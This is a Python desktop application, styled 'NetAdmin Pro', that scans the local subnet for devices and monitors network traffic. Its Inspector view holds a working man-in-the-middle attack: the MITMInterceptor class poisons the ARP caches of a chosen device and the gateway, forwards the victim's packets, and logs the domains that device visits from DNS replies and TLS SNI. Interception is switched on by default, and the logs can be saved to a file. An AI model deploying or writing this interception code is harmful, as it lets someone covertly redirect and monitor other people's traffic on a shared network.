import customtkinter as ctk
import psutil
import threading
import time
import sys
import socket
from scapy.all import ARP, Ether, srp, sniff, conf, send, sendp, DNS, DNSQR, DNSRR
import collections
import subprocess
# ... (rest of imports are fine, just ensuring sendp is there)

class NetworkScanner:
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    @staticmethod
    def scan_network(ip_range, update_callback):
        # ip_range example: "192.168.1.0/24" (using .0 for subnet convention)
        print(f"Scanning range: {ip_range}...")
        
        # Method 1: Try Scapy ARP (Best, but requires Npcap)
        try:
            from scapy.arch.windows import get_windows_if_list
            # Check if we can use scapy layer 2
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            # fast scan
            result = srp(packet, timeout=2, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            
            if devices:
                update_callback(devices)
                return
        except Exception as e:
            print(f"Scapy ARP scan failed (likely missing Npcap): {e}")
            print("Switching to Ping Sweep fallback...")

        # Method 2: Ping Sweep Fallback (Works on standard Windows)
        NetworkScanner.ping_sweep(ip_range, update_callback)

    @staticmethod
    def ping_sweep(ip_range, update_callback):
        # Assumes /24
        base_ip = ".".join(ip_range.split('.')[:3])
        devices = []
        threads = []
        lock = threading.Lock()

        def ping_host(ip):
            try:
                # -n 1 = 1 packet, -w 500 = 500ms timeout
                res = subprocess.run(['ping', '-n', '1', '-w', '500', ip], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL)
                if res.returncode == 0:
                    try:
                        # Get MAC via ARP table check provided by system
                        # This avoids needing raw sockets to see the MAC
                        # 'arp -a' could be parsed but getting hostname is easier
                        hostname = socket.getfqdn(ip)
                    except:
                        hostname = "Unknown"
                        
                    with lock:
                        devices.append({'ip': ip, 'mac': hostname}) # Use Hostname as MAC placeholder if real MAC unavailable
            except:
                pass

        
        # Launch threads for 1..254
        print("Starting ping sweep...")
        active_threads = []
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            t = threading.Thread(target=ping_host, args=(ip,))
            t.start()
            active_threads.append(t)
            # Limit concurrency slightly to avoid system choke
            if len(active_threads) > 50:
                for t in active_threads:
                    t.join()
                active_threads = []
        
        for t in active_threads:
            t.join()

        update_callback(devices)

class TrafficAnalyzer:
    def __init__(self, update_callback, system_stats_callback):
        self.update_callback = update_callback
        self.system_stats_callback = system_stats_callback
        self.running = False
        self.flows = collections.defaultdict(lambda: {'packets': 0, 'bytes': 0, 'last_seen': 0})
        self.lock = threading.Lock()
        
    def start(self):
        self.running = True
        # Start sniffer thread
        threading.Thread(target=self._sniff_loop, daemon=True).start()
        # Start reporter/system stats thread
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        
    def stop(self):
        self.running = False

    def _sniff_loop(self):
        try:
            def pkt_callback(pkt):
                if not self.running: return
                if pkt.haslayer('IP'):
                    ip = pkt.getlayer('IP').dst
                    l = len(pkt)
                    with self.lock:
                        self.flows[ip]['packets'] += 1
                        self.flows[ip]['bytes'] += l
                        self.flows[ip]['last_seen'] = time.time()

            # Try to sniff. If it fails (no Npcap), we just log and exit this thread.
            # The app should continue working with just system stats.
            conf.verb = 0
            while self.running:
                 try:
                     sniff(prn=pkt_callback, store=0, timeout=2, count=10)
                 except:
                     time.sleep(2) # Just wait, maybe interfaces will come up or just idle
        except:
            pass

    def _monitor_loop(self):
        last_sent = psutil.net_io_counters().bytes_sent
        last_recv = psutil.net_io_counters().bytes_recv
        
        while self.running:
            time.sleep(1)
            # System Global Stats (Always works)
            curr_sent = psutil.net_io_counters().bytes_sent
            curr_recv = psutil.net_io_counters().bytes_recv
            
            s_speed = curr_sent - last_sent
            r_speed = curr_recv - last_recv
            
            last_sent = curr_sent
            last_recv = curr_recv
            
            # Send System Stats
            self.system_stats_callback(s_speed, r_speed)
            
            # Send Flow Stats (if any)
            with self.lock:
                sorted_flows = sorted(self.flows.items(), key=lambda x: x[1]['bytes'], reverse=True)[:15]
                self.update_callback(sorted_flows)


class NetAdminApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("NetAdmin Pro - Network Scanner & Monitor")
        self.geometry("1100x700")
        
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.setup_sidebar()
        self.setup_main_area()
        
        # Initialize Monitor
        self.monitor = TrafficAnalyzer(self.update_flow_table, self.update_global_stats)
        self.monitor.start()

    def setup_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(5, weight=1)

        self.logo_label = ctk.CTkLabel(self.sidebar, text="NetAdmin Pro", font=ctk.CTkFont(size=20, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))

        self.btn_scan = ctk.CTkButton(self.sidebar, text="Network Scanner", command=self.show_scanner)
        self.btn_scan.grid(row=1, column=0, padx=20, pady=10)

        self.btn_monitor = ctk.CTkButton(self.sidebar, text="Live Traffic", command=self.show_monitor)
        self.btn_monitor.grid(row=2, column=0, padx=20, pady=10)
        
        self.btn_control = ctk.CTkButton(self.sidebar, text="Inspector", command=self.show_control)
        self.btn_control.grid(row=3, column=0, padx=20, pady=10)
        
        # Status footer in sidebar
        self.status_lbl = ctk.CTkLabel(self.sidebar, text="System: Online", text_color="gray", font=("Arial", 10))
        self.status_lbl.grid(row=5, column=0, padx=20, pady=10, sticky="s")

    def setup_main_area(self):
        self.main_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)
        
        # Create views
        self.scanner_view = ScannerView(self.main_frame)
        self.monitor_view = MonitorView(self.main_frame)
        self.inspector_view = InspectorView(self.main_frame)
        
        self.show_scanner()

    def show_scanner(self):
        self.hide_all_views()
        self.scanner_view.pack(fill="both", expand=True)
        
    def show_monitor(self):
        self.hide_all_views()
        self.monitor_view.pack(fill="both", expand=True)
        
    def show_control(self):
        self.hide_all_views()
        self.inspector_view.pack(fill="both", expand=True)

    def hide_all_views(self):
        self.scanner_view.pack_forget()
        self.monitor_view.pack_forget()
        self.inspector_view.pack_forget()

    def update_global_stats(self, sent, recv):
        # Schedule update on main thread
        self.after(0, lambda: self._safe_update_global_stats(sent, recv))

    def _safe_update_global_stats(self, sent, recv):
        if hasattr(self, 'monitor_view') and self.monitor_view.winfo_exists():
            self.monitor_view.update_system_stats(sent, recv)

    def update_flow_table(self, flows):
        self.after(0, lambda: self._safe_update_flow_table(flows))

    def _safe_update_flow_table(self, flows):
        if hasattr(self, 'monitor_view') and self.monitor_view.winfo_exists():
            self.monitor_view.update_flows(flows)

class ScannerView(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        
        self.label = ctk.CTkLabel(self, text="Connected Devices", font=ctk.CTkFont(size=24, weight="bold"))
        self.label.pack(pady=20, padx=20, anchor="w")
        
        self.scan_btn = ctk.CTkButton(self, text="Start Scan", command=self.start_scan)
        self.scan_btn.pack(pady=10, padx=20, anchor="w")
        
        self.progress_bar = ctk.CTkProgressBar(self, mode="indeterminate", width=400)
        # Don't pack it yet
        
        self.scroll_frame = ctk.CTkScrollableFrame(self)
        self.scroll_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        self.status_label = ctk.CTkLabel(self, text="Ready to scan.")
        self.status_label.pack(pady=5)

    def start_scan(self):
        self.status_label.configure(text="Scanning network... (This may take 1-2 minutes without Npcap)")
        self.scan_btn.configure(state="disabled")
        self.progress_bar.pack(pady=10, padx=20, anchor="w")
        self.progress_bar.start()
        
        # Get local subnet
        local_ip = NetworkScanner.get_local_ip()
        subnet = ".".join(local_ip.split('.')[:3]) + ".0/24"
        
        # Pass a thread-safe callback wrapper
        threading.Thread(target=NetworkScanner.scan_network, args=(subnet, self.safe_display_wrapper), daemon=True).start()

    def safe_display_wrapper(self, devices):
        # Schedule the real display on main thread
        self.after(0, lambda: self.display_results(devices))

    def display_results(self, devices):
        try:
            self.progress_bar.stop()
            self.progress_bar.pack_forget()
            self.scan_btn.configure(state="normal")
            
            # clear old
            for widget in self.scroll_frame.winfo_children():
                widget.destroy()
                
            if not devices:
                self.status_label.configure(text="Scan finished. No recent devices found.")
            else:
                self.status_label.configure(text=f"Scan complete. Found {len(devices)} devices.")
                
                headers = ctk.CTkFrame(self.scroll_frame, fg_color="transparent")
                headers.pack(fill="x", pady=5)
                ctk.CTkLabel(headers, text="IP Address", width=150, anchor="w", font=("Arial", 12, "bold")).pack(side="left", padx=10)
                ctk.CTkLabel(headers, text="MAC/Hostname", width=250, anchor="w", font=("Arial", 12, "bold")).pack(side="left", padx=10)

                for dev in devices:
                    row = ctk.CTkFrame(self.scroll_frame)
                    row.pack(fill="x", pady=2)
                    
                    ctk.CTkLabel(row, text=dev['ip'], width=150, anchor="w").pack(side="left", padx=10)
                    ctk.CTkLabel(row, text=dev.get('mac', 'Unknown'), width=200, anchor="w").pack(side="left", padx=10)
                    
                    # Inspect Button
                    ctk.CTkButton(row, text="Inspect", width=80, 
                                  command=lambda d=dev: self.open_inspector(d['ip'])).pack(side="right", padx=10)

            # Update Control View
            # app = self.winfo_toplevel()
            # if hasattr(app, 'control_view'):
            #     app.control_view.update_devices(devices)
        except Exception as e:
            print(f"UI Update Error: {e}")

    def open_inspector(self, ip):
        app = self.winfo_toplevel()
        if hasattr(app, 'inspector_view'):
            app.inspector_view.set_target(ip)
            app.show_control() # Switch tab

class MonitorView(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        
        self.grid_rowconfigure(3, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        self.label = ctk.CTkLabel(self, text="Real-time Traffic Monitor", font=ctk.CTkFont(size=24, weight="bold"))
        self.label.grid(row=0, column=0, padx=20, pady=20, sticky="w")
        
        # Global Dashboard
        self.dash_frame = ctk.CTkFrame(self)
        self.dash_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
        
        self.dl_card = self._create_card(self.dash_frame, "DOWNLOAD", "#2980b9")
        self.dl_card.pack(side="left", expand=True, fill="both", padx=5, pady=5)
        self.dl_val = ctk.CTkLabel(self.dl_card, text="0 KB/s", font=("Arial", 28, "bold"), text_color="white")
        self.dl_val.pack(pady=10)
        
        self.ul_card = self._create_card(self.dash_frame, "UPLOAD", "#c0392b")
        self.ul_card.pack(side="left", expand=True, fill="both", padx=5, pady=5)
        self.ul_val = ctk.CTkLabel(self.ul_card, text="0 KB/s", font=("Arial", 28, "bold"), text_color="white")
        self.ul_val.pack(pady=10)
        
        # Flow Table
        ctk.CTkLabel(self, text="Active Flows (Requires Npcap)", font=("Arial", 14, "bold")).grid(row=2, column=0, padx=20, pady=(20,5), sticky="w")
        
        self.table_frame = ctk.CTkScrollableFrame(self)
        self.table_frame.grid(row=3, column=0, padx=20, pady=10, sticky="nsew")
        
    def _create_card(self, parent, title, color):
        f = ctk.CTkFrame(parent, fg_color=color)
        ctk.CTkLabel(f, text=title, text_color="white", font=("Arial", 12)).pack(pady=(5,0))
        return f

    def update_system_stats(self, sent, recv):
        try:
            # Always works (uses psutil)
            r_kb = recv / 1024
            s_kb = sent / 1024
            
            self.dl_val.configure(text=f"{r_kb:.1f} KB/s")
            self.ul_val.configure(text=f"{s_kb:.1f} KB/s")
        except: pass

    def update_flows(self, flow_data):
        try:
            # Refresh table
            for w in self.table_frame.winfo_children():
                w.destroy()
                
            if not flow_data:
                ctk.CTkLabel(self.table_frame, text="No flow data. (Install Npcap for details)").pack(pady=20)
                return

            headers = ctk.CTkFrame(self.table_frame, fg_color="transparent")
            headers.pack(fill="x")
            ctk.CTkLabel(headers, text="IP", width=150, anchor="w").pack(side="left")
            ctk.CTkLabel(headers, text="Activity", width=150, anchor="w").pack(side="left")
            
            for ip, stats in flow_data:
                r = ctk.CTkFrame(self.table_frame)
                r.pack(fill="x", pady=2)
                ctk.CTkLabel(r, text=ip, width=150, anchor="w").pack(side="left")
                ctk.CTkLabel(r, text=f"{stats['packets']} pkts", width=150, anchor="w").pack(side="left")
        except: pass
    
class DNSResolver:
    def __init__(self):
        self.cache = {}
        self.lock = threading.Lock()
        
    def get_host(self, ip):
        with self.lock:
            if ip in self.cache:
                return self.cache[ip]
        
        # Initial placeholder
        with self.lock:
            self.cache[ip] = "Resolving..."
            
        threading.Thread(target=self._resolve, args=(ip,), daemon=True).start()
        return "Resolving..."

    def update_cache(self, ip, name):
        # Called by Sniffer when it sees a DNS response
        with self.lock:
            self.cache[ip] = name

    def _resolve(self, ip):
        try:
            # 1. Try socket resolution (Reverse DNS)
            host = socket.gethostbyaddr(ip)[0]
        except:
            # 2. Try simple wellknowns (very basic)
            if ip.startswith("8.8"): host = "Google DNS"
            elif ip.startswith("1.1"): host = "Cloudflare DNS"
            elif ip.startswith("192.168"): host = "Local LAN"
            else: host = "Unknown"
            
        with self.lock:
            # Only overwrite if we don't have a better name from DNS snooping yet
            if self.cache[ip] == "Resolving..." or self.cache[ip] == "Unknown":
                self.cache[ip] = host

class ActivityLogger:
    def __init__(self):
        # logs is now a list of dicts: {'time': str, 'src': str, 'dst': str, 'host': str, 'size': int, 'id': str}
        self.logs = collections.deque(maxlen=25) 
        self.resolver = DNSResolver()

    def log_packet(self, src_ip, dst_ip, size):
        # Filter Multicast noise
        if dst_ip.startswith("224.") or dst_ip.startswith("239."):
             return self.logs

        # Get host (or future promise)
        host = self.resolver.get_host(dst_ip)
        
        timestamp = time.strftime("%H:%M:%S")
        
        # Check if last log is identical (spam reduction, consolidate flows)
        if len(self.logs) > 0 and self.logs[0]['dst'] == dst_ip and self.logs[0]['src'] == src_ip:
             self.logs[0]['size'] += size # Aggregate size
             self.logs[0]['time'] = timestamp
             # Force update name if it resolved recently
             self.logs[0]['host'] = host
        else:
            self.logs.appendleft({
                'time': timestamp,
                'src': src_ip,
                'dst': dst_ip,
                'host': host,
                'size': size,
                'id': f"{src_ip}-{dst_ip}"
            })
            
        return self.logs

class MITMInterceptor:
    def __init__(self):
        self.active = False
        self.target_ip = None
        self.gateway_ip = self._get_gateway()
        self.target_mac = None
        self.gateway_mac = None

    def _get_gateway(self):
        # Method 1: Scapy
        try:
            return conf.route.route("0.0.0.0")[2]
        except: pass
        
        # Method 2: Windows Route Command (Most reliable)
        try:
            output = subprocess.run(["route", "print", "0.0.0.0"], capture_output=True, text=True).stdout
            for line in output.splitlines():
                if "0.0.0.0" in line and "0.0.0.0" in line:
                    parts = line.split()
                    if len(parts) > 2:
                        # 3rd column is usually gateway in 'Network Destination Netmask Gateway Interface'
                        if parts[2] != "On-link":
                             print(f"Detected Gateway via Route: {parts[2]}")
                             return parts[2]
        except: pass
        
        # Method 3: Fallback Guess based on local IP
        try:
            local_ip = NetworkScanner.get_local_ip()
            return local_ip.rsplit('.', 1)[0] + '.1'
        except:
             return "192.168.1.1"

    def get_mac(self, ip):
        # Reliable MAC resolution
        # Method 1: Scapy
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            if ans: return ans[0][1].hwsrc
        except: pass
        
        # Method 2: System ARP Table
        try:
            # Ping to populate ARP
            subprocess.run(['ping', '-n', '1', '-w', '200', ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            out = subprocess.run(['arp', '-a', ip], capture_output=True, text=True).stdout
            
            # Regex for xx-xx-xx-xx-xx-xx or xx:xx:xx:xx:xx:xx
            import re
            m = re.search(r"([0-9A-Fa-f]{1,2}[:-]){5}([0-9A-Fa-f]{1,2})", out)
            if m: 
                mac = m.group(0).replace('-', ':')
                # Pad single digits if necessary (windows sometimes does 0:1:2...)
                parts = mac.split(':')
                return ":".join([p.zfill(2) for p in parts])
        except Exception as e: 
            print(f"Get MAC error: {e}")
            pass
            
        return None

    def start(self, target_ip):
        self.target_ip = target_ip
        # Update gateway just in case
        self.gateway_ip = self._get_gateway()
        
        print(f"Resolving: Target={self.target_ip}, Gateway={self.gateway_ip}")
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.target_mac:
            return False, f"Could not find MAC for Target {target_ip}"
        
        if not self.gateway_mac:
            return False, f"Could not find MAC for Gateway {self.gateway_ip}"
            
        self.active = True
        threading.Thread(target=self._arp_poison_loop, daemon=True).start()
        return True, "MITM Active. Traffic is being redirected."

    def stop(self):
        self.active = False
        time.sleep(1)
        self._restore_network()

    def _arp_poison_loop(self):
        print(f"MITM Loop Started: {self.target_ip} [{self.target_mac}] <-> {self.gateway_ip} [{self.gateway_mac}]")
        while self.active:
            try:
                # Tell Target I am Gateway
                sendp(Ether(dst=self.target_mac)/ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=0)
                # Tell Gateway I am Target
                sendp(Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=0)
                time.sleep(2)
            except: pass

    def _restore_network(self):
        try:
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=3, verbose=0)
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), count=3, verbose=0)
        except: pass

class InspectorView(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        self.logger = ActivityLogger()
        self.interceptor = MITMInterceptor()
        self.monitoring_ip = None
        self.running = False
        
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(3, weight=1)

        self.label = ctk.CTkLabel(self, text="Inspector (Traffic Analyzer)", font=ctk.CTkFont(size=24, weight="bold"))
        self.label.grid(row=0, column=0, padx=20, pady=20, sticky="w")
        
        self.info_lbl = ctk.CTkLabel(self, text="Select a device to monitor.", text_color="gray")
        self.info_lbl.grid(row=1, column=0, padx=20, sticky="w")
        
        # Controls
        self.ctrl_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.ctrl_frame.grid(row=2, column=0, padx=20, pady=5, sticky="ew")
        
        self.active_mode = ctk.CTkSwitch(self.ctrl_frame, text="Active Interception (MITM)")
        self.active_mode.pack(side="left")
        self.active_mode.select() # Enable by default for immediate results
        ctk.CTkLabel(self.ctrl_frame, text="(Required for remote devices)", text_color="gray", font=("Arial", 10)).pack(side="left", padx=5)
        self.stop_btn = ctk.CTkButton(self.ctrl_frame, text="Stop Monitoring", command=self.stop_monitoring, fg_color="#c0392b")
        # Hidden by default

        self.save_btn = ctk.CTkButton(self.ctrl_frame, text="Save Logs", command=self.save_logs, width=100)
        self.save_btn.pack(side="right", padx=10)

        self.log_frame = ctk.CTkScrollableFrame(self)
        self.log_frame.grid(row=3, column=0, padx=20, pady=10, sticky="nsew")

        # Log Logic State
        self.cached_ui_rows = {} # id -> reference to row widgets
    
    def save_logs(self):
        if not self.logger.logs: return
        try:
            filename = f"network_logs_{int(time.time())}.txt"
            with open(filename, "w", encoding='utf-8') as f:
                f.write(f"--- Traffic Log for {self.monitoring_ip} ---\n")
                for log in self.logger.logs:
                    f.write(f"[{log['time']}] {log['host']} ({log['dst']}) - {log['size']} bytes\n")
            
            # Simple Feedback without popup
            original_text = self.save_btn.cget("text")
            self.save_btn.configure(text="Saved!", fg_color="#27ae60")
            self.after(2000, lambda: self.save_btn.configure(text=original_text, fg_color="#3a7ebf"))
        except Exception as e:
            print(f"Save failed: {e}")

    def set_target(self, ip):
        self.monitoring_ip = ip
        self.label.configure(text=f"Inspecting: {ip}")
        self.stop_btn.pack(side="right")
        self.running = True
        
        # Clear logs
        self.logger.logs.clear()
        for w in self.log_frame.winfo_children(): w.destroy()
        self.cached_ui_rows.clear()
        
        # Start Interception if requested
        if self.active_mode.get():
            success, msg = self.interceptor.start(ip)
            if not success:
                self.info_lbl.configure(text=f"Error: {msg}", text_color="red")
            else:
                self.info_lbl.configure(text=f"Active Monitoring: {ip} (Traffic redirected)", text_color="#2ecc71")
        else:
            self.info_lbl.configure(text=f"Passive Monitoring: {ip} (Local/Broadcast only)", text_color="#f39c12")
            
        threading.Thread(target=self._watch_loop, daemon=True).start()

    def stop_monitoring(self):
        self.running = False
        self.interceptor.stop()
        self.label.configure(text="Inspector (Idle)")
        self.stop_btn.pack_forget()
        self.info_lbl.configure(text="Monitoring stopped.", text_color="gray")

    def _parse_sni(self, pkt):
        # Lightweight manual SNI parser
        try:
            if pkt.haslayer('TCP') and pkt.haslayer('Raw'):
                payload = bytes(pkt['Raw'])
                if len(payload) > 50 and payload[0] == 0x16 and payload[5] == 0x01:
                    pos = 43
                    if len(payload) < pos + 1: return None
                    sess_id_len = payload[pos]
                    pos += 1 + sess_id_len
                    
                    if len(payload) < pos + 2: return None
                    cipher_len = int.from_bytes(payload[pos:pos+2], 'big')
                    pos += 2 + cipher_len
                    
                    if len(payload) < pos + 1: return None
                    comp_len = payload[pos]
                    pos += 1 + comp_len
                    
                    if len(payload) < pos + 2: return None
                    ext_total_len = int.from_bytes(payload[pos:pos+2], 'big')
                    pos += 2
                    
                    end = pos + ext_total_len
                    while pos + 4 < end:
                        etype = int.from_bytes(payload[pos:pos+2], 'big')
                        elen = int.from_bytes(payload[pos+2:pos+4], 'big')
                        pos += 4
                        if etype == 0: 
                            if len(payload) < pos + 5: return None
                            name_len = int.from_bytes(payload[pos+3:pos+5], 'big')
                            return payload[pos+5:pos+5+name_len].decode('utf-8')
                        pos += elen
        except: pass
        return None

    def _watch_loop(self):
        def pkt_callback(pkt):
            if not self.running: return
            
            # 1. DNS Snooping
            if pkt.haslayer(DNS) and pkt.haslayer(DNSRR):
                try:
                    for i in range(pkt[DNS].ancount):
                        rr = pkt[DNS].an[i]
                        if rr.type == 1: 
                            ip = rr.rdata
                            name = rr.rrname.decode('utf-8').rstrip('.')
                            self.logger.resolver.update_cache(ip, name)
                except: pass
                
            # 2. SNI Snooping
            sni_host = self._parse_sni(pkt)
            if sni_host and pkt.haslayer('IP'):
                dst_ip = pkt.getlayer('IP').dst
                self.logger.resolver.update_cache(dst_ip, sni_host)

            if pkt.haslayer('IP'):
                src = pkt.getlayer('IP').src
                dst = pkt.getlayer('IP').dst
                length = len(pkt)
                
                # Active MITM
                if self.interceptor.active:
                    try:
                        if src == self.monitoring_ip:
                             pk = pkt.copy()
                             pk[Ether].dst = self.interceptor.gateway_mac
                             sendp(pk, verbose=0)
                             self.logger.log_packet(src, dst, length)
                             self.after(0, self._refresh_log_ui)
                             
                        elif dst == self.monitoring_ip:
                             pk = pkt.copy()
                             pk[Ether].dst = self.interceptor.target_mac
                             sendp(pk, verbose=0)
                    except: pass
                    
                # Passive
                elif src == self.monitoring_ip:
                     self.logger.log_packet(src, dst, length)
                     self.after(0, self._refresh_log_ui)

        while self.running:
             try:
                 sniff(prn=pkt_callback, filter=f"host {self.monitoring_ip}", store=0, timeout=1, count=10)
             except: time.sleep(1)

    def _refresh_log_ui(self):
        # Optimized: Smooth updates
        current_logs = list(self.logger.logs)
        widgets = self.log_frame.winfo_children()
        
        for i, log in enumerate(current_logs):
            if log['host'] == "Resolving...":
                log['host'] = self.logger.resolver.get_host(log['dst'])

            txt_main = f"[{log['time']}] {log['host']} ({log['dst']})"
            txt_size = f"{log['size']} B"
            row_color = "#2c3e50" if "Resolving" not in log['host'] and "Unknown" not in log['host'] else "transparent"
            
            if i < len(widgets):
                row = widgets[i]
                row.configure(fg_color=row_color)
                lbl_main = row.winfo_children()[0]
                lbl_size = row.winfo_children()[1]
                lbl_main.configure(text=txt_main)
                lbl_size.configure(text=txt_size)
            else:
                r = ctk.CTkFrame(self.log_frame, fg_color=row_color)
                r.pack(fill="x", pady=2)
                ctk.CTkLabel(r, text=txt_main, width=400, anchor="w", font=("Consolas", 12)).pack(side="left", padx=5)
                ctk.CTkLabel(r, text=txt_size, width=80, anchor="e", text_color="gray").pack(side="right", padx=5)
                
        if len(widgets) > len(current_logs):
            for k in range(len(current_logs), len(widgets)):
                widgets[k].destroy()

if __name__ == "__main__":
    app = NetAdminApp()
    app.mainloop()
